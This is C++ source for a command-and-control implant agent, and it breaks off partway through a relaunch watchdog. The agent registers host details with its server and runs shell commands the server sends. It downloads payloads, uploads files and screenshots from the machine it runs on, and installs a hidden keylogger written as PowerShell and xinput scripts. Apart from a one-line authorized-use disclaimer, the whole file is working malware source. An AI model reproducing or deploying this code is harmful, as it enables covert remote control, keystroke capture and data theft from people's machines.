/*
 * agent.cpp — C2 agent, C++ port (libcurl).
 *
 * Port of clients/agent.py with identical CLI flags, task types and result
 * shapes. Wire protocol documented in C2/protocol.md.
 *
 * Build:
 *   g++ -std=c++17 -o agent agent.cpp -lcurl
 *   # or with debug:
 *   g++ -g -std=c++17 -o agent agent.cpp -lcurl
 * Usage:
 *   ./agent --server http://127.0.0.1:8000 --token <AGENT_TOKEN>
 *   ./agent --server http://127.0.0.1:8000 --token <AGENT_TOKEN> \
 *       --interval 5 --jitter 2 --verbose
 *
 * Environment variables (accepted when the flag is not given):
 *   WYM_SERVER, WYM_TOKEN, WYM_INTERVAL, WYM_JITTER, WYM_STATE_FILE, WYM_VERBOSE
 *
 * Flags:
 *   --server URL      server base URL (required unless WYM_SERVER is set)
 *   --token TOKEN     shared agent token (required unless WYM_TOKEN is set)
 *   --interval N      heartbeat interval in seconds (default 10, min 1)
 *   --jitter N        random jitter in seconds added to the interval
 *   --state FILE      state file persisting the agent id (default ~/.wymagent_cpp.json)
 *   --verbose         print activity to stdout
 *   -h, --help        show this help and exit
 *
 * Only use against systems you own or are authorized to test.
 */

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cctype>
#include <ctime>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <iostream>
#include <algorithm>
#include <filesystem>
#include <map>
#include <mutex>
#include <signal.h>
#include <unistd.h>
#include <sys/stat.h>
#include <curl/curl.h>

#ifdef _WIN32
#include <windows.h>
#include <process.h>
#define popen _popen
#define pclose _pclose
#ifndef S_ISREG
#define S_ISREG(m) (((m) & _S_IFMT) == _S_IFREG)
#endif
#define PATH_SEP '\\'
#define HOME_ENV "USERPROFILE"
#else
#include <pwd.h>
#include <sys/wait.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define PATH_SEP '/'
#define HOME_ENV "HOME"
#endif

/* ---------------------------------------------------------------- constants */

static constexpr int SHELL_TIMEOUT = 120;
static constexpr int OUTPUT_LIMIT  = 12000;
static constexpr size_t MAX_RESPONSE = 1024 * 1024;

/* ---------------------------------------------------------------- helpers */

static bool g_verbose = false;

static void logmsg(const char *fmt, ...) {
    if (!g_verbose) return;
    va_list args;
    fprintf(stderr, "[*] ");
    va_start(args, fmt);
    vfprintf(stderr, fmt, args);
    va_end(args);
    fprintf(stderr, "\n");
}

static std::string truncate_output(const std::string &text, int limit = OUTPUT_LIMIT) {
    if ((int)text.size() <= limit) return text;
    int head = limit / 5;
    int tail = limit - head - 40;
    int omitted = (int)text.size() - head - tail;
    return text.substr(0, head)
         + "\n... [" + std::to_string(omitted) + " chars truncated] ...\n"
         + text.substr(text.size() - tail);
}

static std::string local_ip() {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return "";
    struct sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);
    inet_pton(AF_INET, "8.8.8.8", &addr.sin_addr);
    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(fd);
        return "";
    }
    struct sockaddr_in local{};
    socklen_t len = sizeof(local);
    getsockname(fd, (struct sockaddr *)&local, &len);
    close(fd);
    char ip[64];
    inet_ntop(AF_INET, &local.sin_addr, ip, sizeof(ip));
    return ip;
}

static std::string get_os_name() {
#ifdef _WIN32
    return "windows";
#elif defined(__APPLE__)
    return "darwin";
#elif defined(__linux__)
    return "linux";
#else
    return "unknown";
#endif
}

static std::string get_arch() {
#ifdef _WIN32
    return "x86_64";
#else
    struct utsname u;
    if (uname(&u) == 0) return u.machine;
    return "unknown";
#endif
}

static std::string get_hostname() {
    char hostname[256] = "unknown";
#ifdef _WIN32
    DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
#else
    if (gethostname(hostname, sizeof(hostname)) != 0)
        strcpy(hostname, "unknown");
#endif
    return hostname;
}

static std::string get_username() {
#ifdef _WIN32
    char user[256] = "";
    DWORD size = sizeof(user);
    GetUserNameA(user, &size);
    return user;
#else
    struct passwd *pw = getpwuid(getuid());
    if (pw) return pw->pw_name;
    const char *eu = getenv("USER");
    return eu ? eu : "unknown";
#endif
}

static std::string g_state_override;   /* --state FILE */

static std::string state_path() {
    if (!g_state_override.empty()) return g_state_override;
    const char *home = getenv(HOME_ENV);
    if (!home) home = ".";
    return std::string(home) + PATH_SEP + ".wymagent_cpp.json";
}

/* ---------------------------------------------------------------- JSON helpers */

static std::string now_str() {
    time_t t = time(nullptr);
#ifdef _WIN32
    struct tm tmv;
    gmtime_s(&tmv, &t);
#else
    struct tm tmv;
    gmtime_r(&t, &tmv);
#endif
    char buf[32];
    strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &tmv);
    return buf;
}

static std::string json_escape(const std::string &s) {
    std::string out;
    out.reserve(s.size() + 16);
    for (char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n"; break;
            case '\r': out += "\\r"; break;
            case '\t': out += "\\t"; break;
            default:   out += c;
        }
    }
    return out;
}

static std::string json_find_string(const std::string &json, const std::string &key) {
    std::string needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return "";
    pos = json.find(':', pos + needle.size());
    if (pos == std::string::npos) return "";
    pos++;
    while (pos < json.size() && (json[pos] == ' ' || json[pos] == '\t')) pos++;
    if (pos >= json.size()) return "";
    if (json[pos] == '"') {
        pos++;
        auto end = json.find('"', pos);
        if (end == std::string::npos) return "";
        return json.substr(pos, end - pos);
    }
    auto end = json.find_first_of(",} \t\n", pos);
    if (end == std::string::npos) end = json.size();
    return json.substr(pos, end - pos);
}

/* ---------------------------------------------------------------- globals */

static char g_server_buf[2048] = "";
static char g_token_buf[1024] = "";
static char g_agent_id_buf[128] = "";
static std::string g_agent_id;
static int g_interval = 10;
static int g_jitter = 0;
static std::string g_self_path;  /* argv[0], used by persistence/lateral */

/* ---------------------------------------------------------------- curl helpers */

/* libcurl verifies TLS certificates by default. Operators using self-signed
 * test certificates can suppress that explicitly with WYM_INSECURE_TLS=1. */
static bool tls_no_verify() {
    const char *e = getenv("WYM_INSECURE_TLS");
    return e && (strcmp(e, "1") == 0 || strcmp(e, "true") == 0 || strcmp(e, "yes") == 0);
}

struct WriteBuffer {
    std::string data;
};

static size_t write_callback(char *ptr, size_t size, size_t nmemb, void *userdata) {
    auto *buf = static_cast<WriteBuffer *>(userdata);
    size_t total = size * nmemb;
    buf->data.append(ptr, total);
    return total;
}

static std::string post_json(const std::string &path, const std::string &json_body, long *out_code = nullptr) {
    CURL *curl = curl_easy_init();
    if (!curl) return "";

    WriteBuffer buf;
    std::string auth = std::string("X-Agent-Token: ") + g_token_buf;

    struct curl_slist *headers = nullptr;
    headers = curl_slist_append(headers, auth.c_str());
    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, path.c_str());
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_body.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buf);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, tls_no_verify() ? 0L : 1L);

    curl_easy_perform(curl);
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    if (out_code) *out_code = http_code;

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    return buf.data;
}

static std::string get_token(const std::string &path, long *out_code = nullptr) {
    CURL *curl = curl_easy_init();
    if (!curl) return "";

    WriteBuffer buf;
    std::string auth = std::string("X-Agent-Token: ") + g_token_buf;
    struct curl_slist *headers = nullptr;
    headers = curl_slist_append(headers, auth.c_str());

    curl_easy_setopt(curl, CURLOPT_URL, path.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buf);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, tls_no_verify() ? 0L : 1L);

    curl_easy_perform(curl);
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    if (out_code) *out_code = http_code;

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    return buf.data;
}

static int get_url_to_file(const std::string &path, const std::string &dest) {
    CURL *curl = curl_easy_init();
    if (!curl) return -1;

    FILE *fp = fopen(dest.c_str(), "wb");
    if (!fp) { curl_easy_cleanup(curl); return -1; }

    std::string auth = std::string("X-Agent-Token: ") + g_token_buf;
    struct curl_slist *headers = nullptr;
    headers = curl_slist_append(headers, auth.c_str());

    curl_easy_setopt(curl, CURLOPT_URL, path.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 120L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, tls_no_verify() ? 0L : 1L);

    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    fclose(fp);

    if (res != CURLE_OK || http_code != 200) {
        remove(dest.c_str());
        return -1;
    }
    return 0;
}

static int upload_file(const std::string &path, const std::string &task_id) {
    CURL *curl = curl_easy_init();
    if (!curl) return -1;

    std::string fname = std::filesystem::path(path).filename().string();
    curl_mime *mime = curl_mime_init(curl);
    curl_mimepart *part = curl_mime_addpart(mime);
    curl_mime_name(part, "file");
    curl_mime_filedata(part, path.c_str());
    curl_mime_filename(part, fname.c_str());
    curl_mime_type(part, "application/octet-stream");

    std::string auth = std::string("X-Agent-Token: ") + g_token_buf;
    struct curl_slist *headers = nullptr;
    headers = curl_slist_append(headers, auth.c_str());

    std::string url = std::string(g_server_buf) + "/api/files/" + task_id;
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 300L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, tls_no_verify() ? 0L : 1L);

    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    curl_mime_free(mime);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    return (res == CURLE_OK && http_code == 200) ? 0 : -1;
}

/* ---------------------------------------------------------------- state */

static void load_id() {
    std::ifstream f(state_path());
    if (!f.is_open()) return;
    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
    g_agent_id = json_find_string(content, "agent_id");
}

static void save_id() {
    std::ofstream f(state_path());
    f << "{\"agent_id\":\"" << json_escape(g_agent_id) << "\"}";
}

/* ------------------------------------------------------------- lifecycle */

static void register_agent() {
    std::string body = "{"
        "\"agent_id\":\"" + json_escape(g_agent_id) + "\","
        "\"hostname\":\"" + json_escape(get_hostname()) + "\","
        "\"username\":\"" + json_escape(get_username()) + "\","
        "\"os\":\"" + get_os_name() + "\","
        "\"arch\":\"" + get_arch() + "\","
        "\"pid\":" + std::to_string(getpid()) + ","
        "\"ip\":\"" + local_ip() + "\","
        "\"version\":\"1.0\","
        "\"type\":\"C++\""
    "}";

    logmsg("registering with %s", g_server_buf);
    long code = 0;
    std::string resp = post_json(std::string(g_server_buf) + "/api/register", body, &code);
    if (code != 200) {
        fprintf(stderr, "register failed: HTTP %ld — will retry on next checkin\n", code);
        return;
    }
    g_agent_id = json_find_string(resp, "agent_id");
    save_id();
    logmsg("agent id: %s", g_agent_id.c_str());
}

static long checkin(std::string &resp) {
    std::string body = "{\"agent_id\":\"" + json_escape(g_agent_id) + "\"}";
    long code = 0;
    resp = post_json(std::string(g_server_buf) + "/api/checkin", body, &code);
    if (code == 404) {
        logmsg("server does not know us — re-registering");
        register_agent();
        resp = "";
        return 0;
    }
    return code;
}

static void report_result(const std::string &task_id, const std::string &output, int exit_code, const std::string &error = "") {
    std::string body = "{"
        "\"agent_id\":\"" + json_escape(g_agent_id) + "\","
        "\"task_id\":\"" + json_escape(task_id) + "\","
        "\"output\":\"" + json_escape(output) + "\","
        "\"exit_code\":" + std::to_string(exit_code) + ","
        "\"error\":\"" + json_escape(error) + "\""
    "}";
    post_json(std::string(g_server_buf) + "/api/result", body);
}

/* ---------------------------------------------------------------- tasks */

static std::string run_shell(const std::string &command, int timeout, int &exit_code) {
    logmsg("executing: %s", command.c_str());
    if (timeout < 1) timeout = 1;
#ifdef _WIN32
    /* Windows: run cmd.exe via CreateProcess, redirect output to a temp file,
     * and enforce the deadline with WaitForSingleObject + taskkill /T. */
    char tmpdir[MAX_PATH] = "";
    GetTempPathA(sizeof(tmpdir), tmpdir);
    DWORD self_pid = GetCurrentProcessId();
    std::string bat = std::string(tmpdir) + "wymrun_" + std::to_string(self_pid) + ".cmd";
    std::string outpath = std::string(tmpdir) + "wymrun_" + std::to_string(self_pid) + ".out";

    FILE *bf = fopen(bat.c_str(), "w");
    if (!bf) {
        exit_code = 1;
        return "failed to create command script";
    }
    fprintf(bf, "@echo off\r\n%s 2>&1\r\nexit /b %%ERRORLEVEL%%\r\n", command.c_str());
    fclose(bf);

    std::string cmdline = "cmd.exe /C \"" + bat + "\" > \"" + outpath + "\"";

    STARTUPINFOA si;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));
    if (!CreateProcessA(NULL, &cmdline[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        remove(bat.c_str());
        exit_code = 1;
        return "failed to start command";
    }

    DWORD waitms = (timeout > 0) ? (DWORD)timeout * 1000u : 1000000u;
    DWORD wr = WaitForSingleObject(pi.hProcess, waitms);
    DWORD code = 1;
    if (wr == WAIT_TIMEOUT) {
        std::string tk = "taskkill /PID " + std::to_string(pi.dwProcessId) + " /T /F >NUL 2>&1";
        system(tk.c_str());
        WaitForSingleObject(pi.hProcess, 5000);
        code = 124; /* mirror timeout(1) */
    } else {
        GetExitCodeProcess(pi.hProcess, &code);
    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    std::string output;
    FILE *of = fopen(outpath.c_str(), "rb");
    if (of) {
        char buf[4096];
        size_t n;
        while ((n = fread(buf, 1, sizeof(buf), of)) > 0) {
            if ((int)output.size() < OUTPUT_LIMIT * 2) output.append(buf, n);
        }
        fclose(of);
    }
    remove(bat.c_str());
    remove(outpath.c_str());

    exit_code = (int)code;
    if (code == 124) {
        return "command timed out (" + std::to_string(timeout) + "s)";
    }
    return truncate_output(output);
#else
    /* POSIX: fork + exec + select loop enforcing the deadline. */
    int pfd[2];
    if (pipe(pfd) != 0) {
        exit_code = 1;
        return "pipe failed";
    }
    pid_t pid = fork();
    if (pid < 0) {
        close(pfd[0]);
        close(pfd[1]);
        exit_code = 1;
        return "fork failed";
    }
    if (pid == 0) {
        close(pfd[0]);
        dup2(pfd[1], STDOUT_FILENO);
        dup2(pfd[1], STDERR_FILENO);
        close(pfd[1]);
        execl("/bin/sh", "sh", "-c", command.c_str(), (char *)NULL);
        _exit(127);
    }
    close(pfd[1]);

    std::string output;
    int elapsed_ms = 0;
    const int deadline_ms = timeout * 1000;
    int status = 0;
    bool timed_out = false;

    while (true) {
        pid_t w = waitpid(pid, &status, WNOHANG);
        if (w == pid || w < 0) break;

        int remaining = deadline_ms - elapsed_ms;
        if (remaining <= 0) {
            timed_out = true;
            kill(pid, SIGKILL);
            waitpid(pid, &status, 0);
            break;
        }

        fd_set rset;
        FD_ZERO(&rset);
        FD_SET(pfd[0], &rset);
        struct timeval tv;
        tv.tv_sec = remaining / 1000;
        tv.tv_usec = (remaining % 1000) * 1000;

        struct timeval t0, t1;
        gettimeofday(&t0, NULL);
        int sel = select(pfd[0] + 1, &rset, NULL, NULL, &tv);
        gettimeofday(&t1, NULL);
        elapsed_ms += (int)((t1.tv_sec - t0.tv_sec) * 1000 + (t1.tv_usec - t0.tv_usec) / 1000);

        if (sel < 0) break;
        if (sel == 0) continue;

        char buf[4096];
        ssize_t n = read(pfd[0], buf, sizeof(buf));
        if (n <= 0) break;
        if ((int)output.size() < OUTPUT_LIMIT * 2)
            output.append(buf, (size_t)n);
    }

    /* drain anything left after child exit, bounded by select(1s) so a
     * backgrounded grandchild holding the pipe open can't hang us */
    {
        char buf[4096];
        struct timeval tv = {1, 0};
        fd_set rset;
        FD_ZERO(&rset);
        FD_SET(pfd[0], &rset);
        while (select(pfd[0] + 1, &rset, NULL, NULL, &tv) > 0) {
            ssize_t n = read(pfd[0], buf, sizeof(buf));
            if (n <= 0) break;
            if ((int)output.size() < OUTPUT_LIMIT * 2)
                output.append(buf, (size_t)n);
            FD_ZERO(&rset);
            FD_SET(pfd[0], &rset);
            tv.tv_sec = 1;
            tv.tv_usec = 0;
        }
    }
    close(pfd[0]);

    if (timed_out) {
        exit_code = 124;
        return "command timed out (" + std::to_string(timeout) + "s)";
    }
    exit_code = WIFEXITED(status) ? WEXITSTATUS(status) : 1;
    return truncate_output(output);
#endif
}

static void task_download(const std::string &task_id, const std::string &args_json, std::string &output, int &exit_code) {
    std::string fname = json_find_string(args_json, "file");
    if (fname.empty()) fname = "payload.bin";
    std::string dest = json_find_string(args_json, "destination");

    /* basename of the remote path */
    auto base = [](const std::string &p) {
        auto pos = p.find_last_of("/\\");
        return pos == std::string::npos ? p : p.substr(pos + 1);
    };

    bool dest_is_dir = false;
    std::error_code ec;
    if (dest.empty()) {
        dest = fname;
    } else if (dest.back() == '/' || dest.back() == '\\') {
        dest_is_dir = true;
    } else if (std::filesystem::is_directory(dest, ec)) {
        dest_is_dir = true;
    }
    if (dest_is_dir) {
        if (dest.back() == '/' || dest.back() == '\\') dest.pop_back();
        dest += PATH_SEP + base(fname);
    }

    /* create parent directory so the download never fails on a missing folder */
    ec.clear();
    auto parent = std::filesystem::path(dest).parent_path();
    if (!parent.empty() && !std::filesystem::exists(parent, ec)) {
        std::filesystem::create_directories(parent, ec);
    }

    logmsg("downloading %s to %s", fname.c_str(), dest.c_str());

    std::string url = std::string(g_server_buf) + "/api/files/" + task_id;
    if (get_url_to_file(url, dest) != 0) {
        output = "download failed";
        exit_code = 1;
        return;
    }

    struct stat st;
    stat(dest.c_str(), &st);
    output = "saved " + std::to_string((long)st.st_size) + " bytes to " + dest;
    exit_code = 0;
}

static void task_upload(const std::string &task_id, const std::string &args_json, std::string &output, int &exit_code) {
    std::string path = json_find_string(args_json, "path");
    if (path.empty()) {
        output = "no path given";
        exit_code = 1;
        return;
    }

    struct stat st;
    if (stat(path.c_str(), &st) != 0) {
        output = "file not found: " + path;
        exit_code = 1;
        return;
    }

    logmsg("uploading %s", path.c_str());

    if (upload_file(path, task_id) == 0) {
        output = "uploaded " + path;
        exit_code = 0;
    } else {
        output = "upload failed";
        exit_code = 1;
    }
}

static void task_screenshot(const std::string &task_id, const std::string &args_json, std::string &output, int &exit_code) {
    std::string label = json_find_string(args_json, "name");
    if (label.empty()) label = "screenshot";

#ifdef _WIN32
    const char *tmpdir = getenv("TEMP");
    if (!tmpdir) tmpdir = ".";
    std::string tmp = std::string(tmpdir) + "\\wymshot_" + std::to_string(getpid()) + ".png";
    std::string tmpfwd;
    for (char c : tmp) tmpfwd += (c == '\\') ? '/' : c;
    std::string ps =
        "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
        "$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
        "$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);"
        "$g=[System.Drawing.Graphics]::FromImage($bmp);"
        "$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size);"
        "$bmp.Save('" + tmpfwd + "');";
    /* cmd /C cannot run PowerShell syntax — invoke powershell explicitly */
    std::string full = "powershell -NoProfile -command \"" + ps + "\"";
    system(full.c_str());
#elif defined(__APPLE__)
    std::string tmp = "/tmp/wymshot_" + std::to_string(getpid()) + ".png";
    system(("screencapture -x \"" + tmp + "\"").c_str());
#else
    std::string tmp = "/tmp/wymshot_" + std::to_string(getpid()) + ".png";
    std::string cmd = "(command -v import && import -window root \"" + tmp + "\") || "
        "(command -v scrot && scrot \"" + tmp + "\") || "
        "(command -v gnome-screenshot && gnome-screenshot -f \"" + tmp + "\")";
    system(cmd.c_str());
#endif

    struct stat st;
    if (stat(tmp.c_str(), &st) != 0 || st.st_size == 0) {
        remove(tmp.c_str());
        output = "error: screenshot failed";
        exit_code = 1;
        return;
    }

    CURL *curl = curl_easy_init();
    if (!curl) {
        remove(tmp.c_str());
        output = "error: curl init failed";
        exit_code = 1;
        return;
    }

    curl_mime *mime = curl_mime_init(curl);
    curl_mimepart *part = curl_mime_addpart(mime);
    curl_mime_name(part, "file");
    curl_mime_filedata(part, tmp.c_str());
    curl_mime_filename(part, (label + ".png").c_str());
    curl_mime_type(part, "image/png");

    std::string auth = std::string("X-Agent-Token: ") + g_token_buf;
    struct curl_slist *headers = nullptr;
    headers = curl_slist_append(headers, auth.c_str());

    std::string url = std::string(g_server_buf) + "/api/files/" + task_id;
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 300L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, tls_no_verify() ? 0L : 1L);

    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    curl_mime_free(mime);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    remove(tmp.c_str());

    if (res != CURLE_OK || http_code != 200) {
        output = "screenshot upload failed: HTTP " + std::to_string(http_code);
        exit_code = 1;
        return;
    }
    output = "screenshot saved (" + label + ".png)";
    exit_code = 0;
}

/* ---------------------------------------------------------------- keylog
 * File-based keystroke logger. 'start' spawns a lightweight background
 * collector (PowerShell GetAsyncKeyState poll on Windows, xinput 2>/dev/null
 * piped through awk on Linux); 'dump' stops the collector and returns the
 * captured text. State lives in the OS temp dir keyed by agent id so it
 * survives across task polls.
 */
static std::string keylog_dir() {
#ifdef _WIN32
    const char *t = getenv("TEMP");
    return t ? t : ".";
#else
    return "/tmp";
#endif
}

static std::string keylog_base(const std::string &agent_id) {
    return keylog_dir() + PATH_SEP + ".wymkeylog_" + agent_id;
}

static bool file_exists(const std::string &p) {
    struct stat st;
    return stat(p.c_str(), &st) == 0;
}

static bool proc_alive(long pid) {
    if (pid <= 0) return false;
#ifdef _WIN32
    std::string cmd = "tasklist /FI \"PID eq " + std::to_string(pid) + "\" >NUL 2>NUL";
    return std::system(cmd.c_str()) == 0;
#else
    return std::system(("kill -0 " + std::to_string(pid) + " 2>/dev/null").c_str()) == 0;
#endif
}

static void keylog_write_collectors(const std::string &base) {
    std::string ps_path = base + ".ps";
    std::string sh_path = base + ".sh";
    std::ofstream ps(ps_path);
    ps << "$C2P = $env:C2P; $C2K = $env:C2K\n"
       << "[IO.File]::WriteAllText($C2P, [string]$PID)\n"
       << "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class K{[DllImport(\"user32.dll\")]public static extern short GetAsyncKeyState(int v);[DllImport(\"user32.dll\")]public static extern short GetKeyState(int v);}'\n"
       << "$l = New-Object 'bool[]' 256\n"
       << "while (1) { Start-Sleep -Milliseconds 25\n"
       << "  for ($v = 8; $v -le 190; $v++) { $d = (([K]::GetAsyncKeyState($v) -band 1) -ne 0)\n"
       << "    if ($d -ne $l[$v]) { if ($d) { $c = $null\n"
       << "      if ($v -ge 65 -and $v -le 90) { $sh = (([K]::GetAsyncKeyState(16) -band 0x8000) -ne 0); $cp = (([K]::GetKeyState(20) -band 1) -ne 0); $c = [char]($v + $(if ($sh -ne $cp) { 0 } else { 32 })) }\n"
       << "      elseif ($v -ge 48 -and $v -le 57) { $c = [char]$v } elseif ($v -eq 32) { $c = ' ' }\n"
       << "      elseif ($v -eq 13) { $c = [char]10 } elseif ($v -eq 9) { $c = '[TAB]' }\n"
       << "      elseif ($v -eq 8) { $c = '[BACKSPACE]' } elseif ($v -eq 27) { $c = '[ESC]' } elseif ($v -eq 46) { $c = '[DEL]' }\n"
       << "      elseif ($v -eq 37) { $c = '[LEFT]' } elseif ($v -eq 38) { $c = '[UP]' }\n"
       << "      elseif ($v -eq 39) { $c = '[RIGHT]' } elseif ($v -eq 40) { $c = '[DOWN]' }\n"
       << "      elseif ($v -ge 112 -and $v -le 123) { $c = '[F' + ($v - 111) + ']' }\n"
       << "      elseif ($v -eq 186) { $c = ';' } elseif ($v -eq 187) { $c = '=' }\n"
       << "      elseif ($v -eq 188) { $c = ',' } elseif ($v -eq 189) { $c = '-' }\n"
       << "      elseif ($v -eq 190) { $c = '.' } elseif ($v -eq 191) { $c = '/' }\n"
       << "      elseif ($v -eq 192) { $c = '`' } elseif ($v -eq 219) { $c = '[' }\n"
       << "      elseif ($v -eq 220) { $c = '\\' } elseif ($v -eq 221) { $c = ']' }\n"
       << "      elseif ($v -eq 222) { $c = \"'\" }\n"
       << "      if ($c) { [IO.File]::AppendAllText($C2K, [string]$c) } }\n"
       << "    $l[$v] = $d } } }\n";
    ps.close();

    std::ofstream sh(sh_path);
    sh << "#!/bin/sh\n"
       << "C2P=${C2P:-/tmp/.wymnope}; C2K=${C2K:-/tmp/.wymnope}\n"
       << "echo $$ > \"$C2P\"\n"
       << "kid=$(xinput list 2>/dev/null | grep -i -m1 keyboard | sed -E 's/.*id=([0-9]+).*/\\1/')\n"
       << "[ -z \"$kid\" ] && exit 1\n"
       << "xinput test \"$kid\" 2>/dev/null | awk -v p=\"$C2K\" '\n"
       << "BEGIN { n = split(\"2 3 4 5 6 7 8 9 10 11 16 17 18 19 20 21 22 23 24 25 30 31 32 33 34 35 36 37 38 44 45 46 47 48 49 50\", a, \" \"); s = \"1234567890qwertyuiopasdfghjklzxcvbnm\"; for (i = 1; i <= length(s); i++) m[a[i]] = substr(s, i, 1) }\n"
       << "{ if ($1 == \"key\" && $2 == \"press\") { c = m[$3]; if ($3 == 57) c = \" \"; else if ($3 == 28) c = \"\\n\"; else if ($3 == 15) c = \"[TAB]\"; else if ($3 == 14) c = \"[BACKSPACE]\"; else if ($3 == 1) c = \"[ESC]\"; else if ($3 == 111) c = \"[DEL]\"; else if ($3 == 42 || $3 == 54) c = \"[SHIFT]\"; else if ($3 == 29 || $3 == 97) c = \"[CTRL]\"; else if ($3 == 56 || $3 == 100) c = \"[ALT]\"; if (c != \"\") printf \"%s\", c > p } }'\n";
    sh.close();
}

static std::string keylog_start(const std::string &agent_id) {
    std::string base = keylog_base(agent_id);
    std::string pidf = base + ".pid";
    if (file_exists(pidf)) {
        std::ifstream f(pidf);
        long pid = 0;
        f >> pid;
        if (proc_alive(pid)) return "keylogger already running";
    }
    keylog_write_collectors(base);
    remove((base + ".log").c_str());
    std::string cmd;
#ifdef _WIN32
    cmd = "start /b \"\" powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"" + base + ".ps\"";
#else
    cmd = "nohup sh \"" + base + ".sh\" >/dev/null 2>&1 &";
#endif
    std::string env = "C2P=" + pidf + " C2K=" + base + ".log ";
    std::system((env + cmd).c_str());
    for (int i = 0; i < 25 && !file_exists(pidf); i++) {
#ifdef _WIN32
        Sleep(100);
#else
        usleep(100000);
#endif
    }
    if (!file_exists(pidf)) return "error: no keylogging tool available (powershell/xinput needed)";
    return "keylogger started";
}

static std::string keylog_stop(const std::string &agent_id) {
    std::string base = keylog_base(agent_id);
    std::string pidf = base + ".pid";
    if (!file_exists(pidf)) return "keylogger not running";
    std::ifstream f(pidf);
    long pid = 0;
    f >> pid;
    if (proc_alive(pid)) {
#ifdef _WIN32
        std::system(("taskkill /PID " + std::to_string(pid) + " /F /T >NUL 2>&1").c_str());
#else
        std::system(("kill " + std::to_string(pid) + " >/dev/null 2>&1").c_str());
#endif
    }
    remove(pidf.c_str());
    return "keylogger stopped";
}

static std::string keylog_dump(const std::string &agent_id) {
    std::string output = keylog_stop(agent_id);
    if (output != "keylogger stopped") return output;
    std::string logf = keylog_base(agent_id) + ".log";
    std::ifstream f(logf, std::ios::binary);
    std::stringstream ss;
    ss << f.rdbuf();
    std::string text = ss.str();
    if (text.empty()) return "(no keystrokes recorded)";
    if ((int)text.size() > 8000) text = "..." + text.substr(text.size() - 8000);
    return text;
}

/* ----------------------------------------------------------------- clone
 * Cross-agent resurrection watchdog. Watcher state lives in a global map
 * keyed by target; every main-loop iteration tasks that are due (interval
 * elapsed) GET {server}/api/clone/status/{target}; if the target is
 * dead/stale the relaunch command is fired detached.
 */
struct CloneWatcher {
    std::string status;
    std::string last_check;
    int relaunches = 0;
    std::string command;
    int interval = 30;
    long next_check = 0;
};

static std::map<std::string, CloneWatcher> g_clones;
static std::mutex g_clones_mutex;

static void relaunch_detached(const std::string &command) {
    logmsg("clone: relaunching detached: %s", command.c_str());
#ifdef _WIN32
    std::string cmdline = "cmd.exe /C " + command;
    STARTUPINFOA si;
